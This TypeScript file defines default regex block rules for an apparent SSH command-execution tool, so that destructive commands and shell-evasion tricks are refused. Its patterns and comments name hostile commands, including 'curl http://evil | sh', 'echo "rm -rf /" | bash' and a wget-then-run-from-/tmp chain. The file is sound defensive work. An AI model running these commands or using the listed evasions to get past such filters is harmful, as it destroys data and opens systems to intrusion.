import type { SecurityRuleRaw } from './types.js';

// Default blocked command rules — extracted from ssh-mcp-multi DEFAULT_BLOCKED_RULES.
// These catch destructive operations that should never run without explicit override.

export const DEFAULT_BLOCKED_RULES: SecurityRuleRaw[] = [
  // ── Filesystem destruction ──────────────────────────────────────────────
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*rm\\s+(-\\w*\\s+)*/(\\s|$)',
    reason: '禁止删除根目录 (rm /)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*rm\\s+(-\\w*\\s+)*/etc\\b',
    reason: '禁止删除 /etc 下的系统文件 (rm /etc)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*mkfs(\\.|\\s|$)',
    reason: '禁止格式化文件系统 (mkfs)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*dd\\s+.*of=/dev/',
    reason: '禁止直接写块设备 (dd to block device)',
    severity: 'critical',
  },
  // ── System control ──────────────────────────────────────────────────────
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*(shutdown|poweroff|halt)\\b',
    reason: '禁止关机 (shutdown/poweroff/halt)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*reboot\\b',
    reason: '禁止重启 (reboot)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*init\\s+[06]\\b',
    reason: '禁止切换到关机/重启运行级别 (init 0/6)',
    severity: 'critical',
  },
  // ── Network destruction ─────────────────────────────────────────────────
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*iptables\\s+-F\\b',
    reason: '禁止清空防火墙规则 (iptables -F)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*ip\\s+link\\s+set\\s+\\S+\\s+down\\b',
    reason: '禁止关闭网络接口 (ip link set down)',
    severity: 'high',
  },
  // ── User/permission manipulation ────────────────────────────────────────
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*passwd\\s+root\\b',
    reason: '禁止修改 root 密码 (passwd root)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*userdel\\s+(-\\w*\\s+)?root\\b',
    reason: '禁止删除 root 用户 (userdel root)',
    severity: 'critical',
  },
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*(chmod|chown)\\s+(-\\w*\\s+)?(000|777)\\s+/',
    reason: '禁止在根路径设置极端权限 (chmod/chown 000/777 on /)',
    severity: 'high',
  },
  // ── Package removal (system-critical) ───────────────────────────────────
  {
    pattern:
      '(^|\\s|;|&&|\\|\\|)\\s*(apt|yum|dnf)\\s+remove\\s+.*\\b(kernel|systemd|bash|coreutils|openssh|sudo)\\b',
    reason: '禁止卸载关键系统包 (removing critical packages)',
    severity: 'critical',
  },
  // ── Overwriting critical files ──────────────────────────────────────────
  {
    pattern: '(>\\s*|>>\\s*)/etc/(passwd|shadow|sudoers|ssh/sshd_config)(\\s|$)',
    reason: '禁止覆盖关键系统文件 (overwriting /etc/passwd, shadow, etc.)',
    severity: 'critical',
  },
  // ── Kernel module removal ───────────────────────────────────────────────
  {
    pattern: '(^|\\s|;|&&|\\|\\|)\\s*modprobe\\s+-r\\s+\\S+',
    reason: '禁止卸载内核模块 (modprobe -r)',
    severity: 'high',
  },
  // ── Evasion/obfuscation ─────────────────────────────────────────────────
  {
    pattern:
      '(^|\\s|;|&&|\\|\\|)\\s*(eval|bash\\s+-c|sh\\s+-c)\\s+.*\\b(rm|shutdown|reboot|mkfs|dd|halt|poweroff|passwd)\\b',
    reason: '禁止通过 eval/bash -c/sh -c 间接执行危险命令',
    severity: 'critical',
  },
  {
    pattern: '(base64\\s+-d|gunzip|gzip\\s+-d)\\s*.*\\|\\s*(bash|sh)\\b',
    reason: '禁止通过编码/压缩绕过执行命令 (encoded command execution)',
    severity: 'critical',
  },
  // ── Interpreter one-liners with dangerous content ────────────────────────
  {
    pattern:
      '(^|\\s|;|&&|\\|\\|)\\s*(python|python3|perl|ruby)\\s+(-[ec]\\s+|-e\\s).*\\b(rm|shutdown|reboot|mkfs|dd|halt|poweroff|passwd|os\\.system|subprocess|exec)\\b',
    reason: '禁止通过解释器一行命令执行危险操作 (interpreter one-liner evasion)',
    severity: 'critical',
  },
  // ── Heredoc / process substitution feeding a shell ──────────────────────
  {
    pattern: '<<\\s*[\'"]?\\w+[\'"]?\\s*\\|\\s*(bash|sh)\\b',
    reason: '禁止通过 heredoc 管道执行任意命令 (heredoc to shell)',
    severity: 'critical',
  },
  {
    pattern: '\\b(bash|sh)\\s+<<\\s*[\'"]?\\w+',
    reason: '禁止通过 heredoc 向 shell 注入多行命令 (shell heredoc injection)',
    severity: 'critical',
  },
  {
    pattern: '<\\([^)]+\\)\\s*(bash|sh)\\b',
    reason: '禁止通过进程替换执行任意命令 (process substitution to shell)',
    severity: 'critical',
  },
  {
    pattern: '\\b(bash|sh)\\s+<\\(',
    reason: '禁止通过进程替换向 shell 注入命令 (shell fed by process substitution)',
    severity: 'critical',
  },
  // ── Dangerous commands inside command substitution $(...) ───────────────
  // Catches dangerous commands embedded in $() regardless of nesting.
  // Without this, `echo $(echo $(shutdown -h now))` could bypass the
  // blocked rules because the inner extraction regex stops at the first ).
  // Note: \b after word-based patterns only (not after / or /dev/).
  {
    pattern:
      '\\$\\([^)]*\\b(rm\\s+(-\\w*\\s+)*/|shutdown\\b|reboot\\b|mkfs\\b|dd\\s+.*of=/dev/|halt\\b|poweroff\\b|passwd\\s+root\\b)',
    reason: '禁止在命令替换中嵌入危险命令 (dangerous command in substitution)',
    severity: 'critical',
  },
  // ── Pipe to shell — arbitrary command execution via stdin ────────────────
  // Catches `echo "rm -rf /" | bash`, `curl http://evil | sh`, etc.
  // Piping content into a shell is a classic evasion technique — the
  // piped content bypasses the classifier because it's data, not a command.
  {
    pattern: '\\|\\s*(bash|sh)(\\s|$)',
    reason: '禁止通过管道向 shell 注入命令 (pipe to shell execution)',
    severity: 'critical',
  },
  // ── find -exec with dangerous commands ───────────────────────────────────
  // Belt-and-suspenders: the classifier also reclassifies `find -exec` as
  // WRITE, but in Autopilot mode WRITE commands auto-execute. This rule
  // hard-blocks find -exec with known dangerous commands regardless of mode.
  // Note: no trailing \b after the alternation — patterns like `rm\s` end
  // with a space, and \b after a space requires a word char next (which `-`
  // in `rm -rf` is not).
  {
    pattern:
      'find\\s+.*-exec(ute|dir)?\\s+.*\\b(rm\\s|chmod\\s|chown\\s|shutdown\\b|reboot\\b|mkfs\\b|dd\\s|halt\\b|poweroff\\b|passwd\\b)',
    reason: '禁止通过 find -exec 执行危险命令 (find -exec with dangerous command)',
    severity: 'critical',
  },
  // ── awk with command execution ───────────────────────────────────────────
  // awk's system() and | getline can execute arbitrary commands.
  // Catches both `system(...)` (with parens) and `"cmd" | getline` (pipe form).
  {
    pattern: '(awk|gawk|mawk)\\s+.*(system\\s*\\(|\\|\\s*getline)',
    reason: '禁止通过 awk 执行系统命令 (awk command execution)',
    severity: 'critical',
  },
  // ── Executing scripts from temp directories ─────────────────────────────
  // Catches download-and-execute chains: `wget ... && bash /tmp/x.sh`
  {
    pattern: '\\b(bash|sh)\\s+/(tmp|dev/shm|var/tmp)/',
    reason: '禁止执行临时目录中的脚本 (executing script from temp directory)',
    severity: 'high',
  },
];
